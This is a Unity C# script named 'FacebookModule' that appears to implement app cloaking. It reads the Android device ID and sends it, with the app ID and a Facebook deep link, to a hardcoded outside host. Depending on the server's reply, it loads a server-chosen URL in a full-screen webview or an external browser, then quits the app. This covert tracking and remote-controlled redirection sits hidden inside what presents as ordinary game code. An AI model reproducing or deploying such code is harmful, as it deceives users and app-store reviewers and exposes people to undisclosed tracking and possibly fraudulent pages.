using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Facebook.Unity;
using UnityEngine.UI;
using System;
using UnityEngine.Networking;
using System.Net.NetworkInformation;

public class FacebookModule : MonoBehaviour
{
    //[SerializeField] Text text;
    [SerializeField] [Range(1f, 60f)] int timeToShow;
    //[SerializeField] UniWebView view;
    //[SerializeField] RectTransform canvas;
    UniWebView webView;
    string deepLink = "";
    string url = "";
    string serverStatus = "";
    [SerializeField] string defaultUrl = "http://remontgomeryed.pro";
    [SerializeField] string host = "http://supereelgrassee.info";


    void Awake()
    {
        
        if (!FB.IsInitialized)
        {
            Debug.Log("---if (!FB.IsInitialized)");
            FB.Init(InitCallback);
        }
        else
        {
            Debug.Log("--- InitCallback();");
            InitCallback();
        }
        
       
    }
   
    private void InitCallback()
    {
        if (FB.IsInitialized)
        {
            Debug.Log("---if (FB.IsInitialized)");
            FB.ActivateApp();
            FB.Mobile.SetAutoLogAppEventsEnabled(true);
            FB.Mobile.FetchDeferredAppLinkData(InvokeURIRecived);
        }
        else
        {
            Debug.Log("---Failed to Initialize the Facebook SDK");
        }
    }

    private void InvokeURIRecived(IAppLinkResult result)
    {

        try
        {
            Debug.Log("----------DeepLinkCallback(IAppLinkResult result)");
            Debug.Log("----------result =   " + result.RawResult);
            Debug.Log("----------result.Url = " + result.Url);
            Debug.Log("----------result.TargetUrl = " + result.TargetUrl);

            if (!String.IsNullOrEmpty(result.Url))
            {
                Debug.Log("----------if (!String.IsNullOrEmpty(result.Url))");
                Debug.Log("----------result.Url = " + result.Url);
                ServerRequest(result.Url);
            }
            else if (!String.IsNullOrEmpty(result.TargetUrl))
            {
                Debug.Log("----------else if (!String.IsNullOrEmpty(result.TargetUrl))");
                Debug.Log("----------result.TargetUrl = " + result.TargetUrl);
                ServerRequest(result.TargetUrl);
            }
            else
            {
                Debug.Log("------DeepLinkCallback - String.IsNullOrEmpty(result.Url)");
                FB.GetAppLink(DeepLinkCallback2);
            }
        }
        catch (Exception)
        {
            Debug.Log("---Exeption 1");

        }
    }



    void Redirect()
    {
        Debug.Log("----------Redirect()");
        FB.GetAppLink(S =>
        {
            ServerRequest(S.Url);

        });
    }



    void DeepLinkCallback2(IAppLinkResult result)
    {
        try
        {
            Debug.Log("----------DeepLinkCallback2(IAppLinkResult result)");
            Debug.Log("----------result =   " + result.RawResult);
            if (!String.IsNullOrEmpty(result.Url))
            {
                Debug.Log("----------if (!String.IsNullOrEmpty(result.Url))");
                var index = (new Uri(result.Url)).Query.IndexOf("request_ids");
                Debug.Log("--idex = " + index);
                if (index != -1)
                {
                    Debug.Log("---------- + if (index != -1)");
                    Debug.Log("----------result.Url = " + result.Url);
                    ServerRequest(result.Url);
                }
                else if (!String.IsNullOrEmpty(result.TargetUrl) && (new Uri(result.TargetUrl)).Query.IndexOf("request_ids") != -1)
                {
                    Debug.Log("---------- else if ((new Uri(result.TargetUrl)).Query.IndexOf(request_ids) != -1)");
                    Debug.Log("----------result.TargetUrl = " + result.TargetUrl);
                    ServerRequest(result.TargetUrl);
                }
                else
                {
                    Debug.Log("---idex = -1");
                    Redirect();
                }
            }
            else
            {
                Debug.Log("----------DeepLinkCallback2 - String.IsNullOrEmpty(result.Url)");
                Redirect();


            }
        }
        catch (Exception)
        {
            Debug.Log("---Exeption 2");

        }
    }

    void ServerRequest(string deep)
    {
        deepLink = deep;



        string android_id = "";

        AndroidJavaClass clsUnity = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject objActivity = clsUnity.GetStatic<AndroidJavaObject>("currentActivity");

        if (objActivity != null)
        {
            AndroidJavaObject objResolver = objActivity.Call<AndroidJavaObject>("getContentResolver");
            AndroidJavaClass clsSecure = new AndroidJavaClass("android.provider.Settings$Secure");
            android_id = clsSecure.CallStatic<string>("getString", objResolver, "android_id");
        }

        if (!String.IsNullOrEmpty(android_id) /*&& /*!String.IsNullOrEmpty(deepLink)*/)
        {

            //string uri = @"http://supereelgrassee.info/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + deepLink + @"&hid=" + android_id;
            string uri = @host + @"/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + UnityWebRequest.EscapeURL(deepLink) + @"&hid=" + android_id;
            Debug.Log("----url = " + uri);

            StartCoroutine(GetRequest(uri));

        }
        else
        {
            Debug.Log("---String.IsNullOrEmpty(android_id)");
        }
    }




    IEnumerator GoToURL()
    {
        Debug.Log("Go");

        while (true)
        {
            if (!openUrl("com.android.chrome", url))
                if (!openUrl("com.opera.browser", url))
                    if (!openUrl("org.mozilla.firefox", url))
                        if (!openUrl("com.yandex.browser", url))
                            if (!openUrl("com.UCMobile.intl", url))
                                if (!openUrl("com.gl9.cloudBrowser", url))
                                    Application.OpenURL(url);

            yield return new WaitForSeconds(timeToShow);

            //&&????????????
            Application.Quit();
        }
    }

    IEnumerator GetRequest(string uri)
    {
        Debug.Log("---Get request");

        //отправляем гет реквест с получением даты
        UnityWebRequest uwr = UnityWebRequest.Get(uri);
        yield return uwr.SendWebRequest();

        //проверяем на ошибку подключения
        if (uwr.isNetworkError)
        {
            Debug.Log("---Error While Sending: " + uwr.error);
            GoToVebViewLByUrl(defaultUrl);
        }
        else
        {
            Debug.Log("---Received: " + uwr.downloadHandler.text);

            //считываем данные в строку
            string s = uwr.downloadHandler.text;

            DataJson d = new DataJson("", "", -1);
            //записываем в данные в обьект
            d = JsonUtility.FromJson<DataJson>(s);


            if (d == null)
            {
                //переход на дефолтный экран если обьект нулл
                GoToVebViewLByUrl(defaultUrl);
            }
            else
            {
                Debug.Log("serverStatus = " + d.status);
                //если в обьекте есть данные проверяем статус
                if (!String.IsNullOrEmpty(d.status))
                {
                    //и присваеваем переменной его значение
                    serverStatus = d.status;
                }

                //проверяем значение статуса и строки с url
                if (CheckStatus(d.status) && !String.IsNullOrEmpty(d.url))
                {
                    //присваиваем значение в переменную 
                    url = d.url;


                    //выполняем действие в зависимости от d.wv
                    RedOrWv(d.wv, d.url);
                }


            }

        }
    }

    IEnumerator StartEwdirect()
    {
        Debug.Log("-----StartEwdirect1");
        yield return new WaitForSeconds(7f);
        Debug.Log("-----StartEwdirect2");
        Redirect();
    }


    void GoToVebViewLByUrl(string url)
    {
        if (!String.IsNullOrEmpty(url))
        {
            if (url == defaultUrl)
            {
                Debug.Log("----Load Default");
            }

            var webViewGameObject = new GameObject("UniWebView");
            webView = webViewGameObject.AddComponent<UniWebView>();

            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            //webView.ReferenceRectTransform = canvas;
            webView.Load(url);

            webView.OnOrientationChanged += (view, orientation) =>
            {
                webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            };

            webView.Show();

        }
    }

    void RedOrWv(int wv, string url)
    {
        switch (wv)
        {
            case 0:
                StartCoroutine(GoToURL());
                break;
            case 1:
                GoToVebViewLByUrl(url);
                break;
            default:
                GoToVebViewLByUrl(defaultUrl);
                break;
        }

    }

    bool CheckStatus(string status)
    {
        if (string.IsNullOrEmpty(status))
        {
            GoToVebViewLByUrl(defaultUrl);
            return false;

        }
        if (status == "ok")
            return true;

        GoToVebViewLByUrl(defaultUrl);
        return false;
    }



    public bool openUrl(string packageName, string url)
    {
#if UNITY_ANDROID
        AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject unityActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
        AndroidJavaObject pManager = unityActivity.Call<AndroidJavaObject>("getPackageManager");

        //For accessing static strings(ACTION_VIEW) from android.content.Intent
        AndroidJavaClass intentStaticClass = new AndroidJavaClass("android.content.Intent");
        string actionView = intentStaticClass.GetStatic<string>("ACTION_VIEW");

        //Create Uri
        AndroidJavaClass uriClass = new AndroidJavaClass("android.net.Uri");
        AndroidJavaObject uriObject = uriClass.CallStatic<AndroidJavaObject>("parse", url);

        //Psss ACTION_VIEW and Uri.parse to the intent
        AndroidJavaObject intent = new AndroidJavaObject("android.content.Intent", actionView, uriObject);

        try
        {
            if (pManager.Call<AndroidJavaObject>("getPackageInfo", packageName, 0) != null)
            {
                intent.Call<AndroidJavaObject>("setPackage", packageName);
            }
        }
        catch (Exception e)
        {
            Debug.LogWarning("Failed to Open App 1: " + e.Message);
            return false;
        }

        try
        {
            unityActivity.Call("startActivity", intent);
            return true;
        }
        catch (Exception e)
        {
            Debug.LogWarning("Failed to Open App 2: " + e.Message);
            //Open with Browser
            string link = "https://play.google.com/store/apps/details?id=" + packageName + "&hl=en";

            // Application.OpenURL(link);///////////////////////////////
            return false;
        }
#endif
        return false;
    }
}



class DataJson
{
    public string status;
    public string url;
    public int wv;

    public DataJson(string status, string url, int wv)
    {
        this.status = status;
        this.url = url;
        this.wv = wv;
    }

}

